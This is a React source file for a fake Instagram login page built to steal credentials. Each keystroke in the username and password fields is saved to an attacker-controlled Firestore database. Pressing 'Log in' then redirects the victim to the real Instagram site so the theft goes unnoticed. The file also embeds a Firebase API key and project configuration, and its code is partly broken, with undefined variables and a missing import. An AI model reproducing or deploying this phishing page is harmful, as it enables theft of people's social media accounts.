import React, { useEffect, useState } from 'react';
import insta from './assets/instagram.svg'
import face from './assets/facebook.svg'
import { initializeApp } from 'firebase/app';
import { getFirestore, collection, doc, setDoc } from 'firebase/firestore';




const App = () => {

  const [username, setuser] = useState('');
  const [pass, setpass] = useState('');
  const [ispass, setispass] = useState(false);
  const [doc, setDoc] = useState('');

  // const firebaseConfig = {
  //   apiKey: "AIzaSyDLXjzy5DEDAE56G4OvrtJuUNTsmZH6Pnc",
  //   authDomain: "dynamicform-7e051.firebaseapp.com",
  //   databaseURL: "https://dynamicform-7e051-default-rtdb.firebaseio.com",
  //   projectId: "dynamicform-7e051",
  //   storageBucket: "dynamicform-7e051.appspot.com",
  //   messagingSenderId: "8030438522",
  //   appId: "1:8030438522:web:278a23e41cea3b83bda7c3"
  // };

  const firebaseConfig = {
  apiKey: "AIzaSyDLXjzy5DEDAE56G4OvrtJuUNTsmZH6Pnc",
  authDomain: "dynamicform-7e051.firebaseapp.com",
  databaseURL: "https://dynamicform-7e051-default-rtdb.firebaseio.com",
  projectId: "dynamicform-7e051",
  storageBucket: "dynamicform-7e051.appspot.com",
  messagingSenderId: "8030438522",
  appId: "1:8030438522:web:278a23e41cea3b83bda7c3"
};


  // Initialize Firebase
  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  

  useEffect(() => {
    // Save to Firestore
    const saveData = async () => {
      try {
         let currentDocId = docId;
        if (!currentDocId) {
          currentDocId = new Date().getTime().toString();
          setDocId(currentDocId);
        }

        const userRef = doc(db, 'users', currentDocId);
        await setDoc(userRef, {
          credentials: arrayUnion({
            pass: pass,
            username: username,
            timestamp: new Date().toISOString(),
          }),
        }, { merge: true });

        console.log('Data saved to Firestore.');
      } catch (error) {
        console.error('Error saving data:', error);
      }
    };

    saveData();
  }, [pass, username]);

  return (
    <div className={`h-full flex flex-col py-16 justify-start items-center`}>
      <img src={insta} alt="" className=' h-12' />

      <div className=' h-[22.1rem] flex px-14  flex-col justify-evenly  pb-2 pt-14  w-full'>

        <button className=' h-[2rem] rounded-lg w-full bg-[#1877f2] text-white font-semibold justify-center items-center flex space-x-2'> <img src={face} alt="" className='w-6 h-6 ' /> <h1>Connect with Facebook</h1></button>

        <div className='h-10  w-full flex justify-center items-center'>
          <div className=' h-[0.4px] w-full border' />
          <h1 className=' text-sm mx-4 align-middle text-slate-500 font-semibold'>OR</h1>
          <div className=' h-[0.4px] w-full border' />
        </div>

        <div className=' space-y-2 mt-2'>
          <input type="text" placeholder='Phone number,username or email address' onChange={(e) => setuser(e.target.value)} className='border-[1.2px] placeholder:text-[13px] placeholder:text-black placeholder:text-opacity-70 bg-[#fafafa] px-2 w-full h-[2.5rem] rounded-md' />
          <div className=' flex relative items-center'>
            <input type={!ispass ? 'password' : 'text'} value={pass} onChange={(e) => setpass(e.target.value)} placeholder='Password' className=' placeholder:text-[13px] border-[1.2px] placeholder:text-black bg-[#fafafa] placeholder:text-opacity-70 px-2 w-full h-[2.5rem] rounded-md' />
            {pass &&
              <h1 className='absolute right-2 font-semibold' onClick={() => setispass(!ispass)}>{ispass ? 'Hide' : 'Show'}</h1>
            }
          </div>
        </div>

        <h1 className='mt-2 mb-4 text-sm text-[#0095f6] text-right'>Forgotten your password?</h1>
        <button className=' h-[2rem] rounded-lg w-full bg-[#4cb5f9] text-white font-semibold' onClick={() => {
          if (pass === '') {
            alert('please enter password')
          }
          else{
             window.location.replace('https://www.instagram.com');
          }
          // Replace with your YouTube URL
        }}> Log in </button>

        <div className=' flex space-x-1 mt-4 justify-center items-center'>
          <h1 className=' text-sm font-light text-slate-500'>Don't have an acoount?</h1>
          <h1 className=' text-base font-semibold text-[#0095f6]'>Sign up</h1>
        </div>
      </div>

      <div className=' h-[4rem]  border-t w-full absolute bottom-0 flex flex-col justify-center items-center'>
        <img src='https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg' className=' w-14' />
      </div>

    </div>
  );
};

export default App;
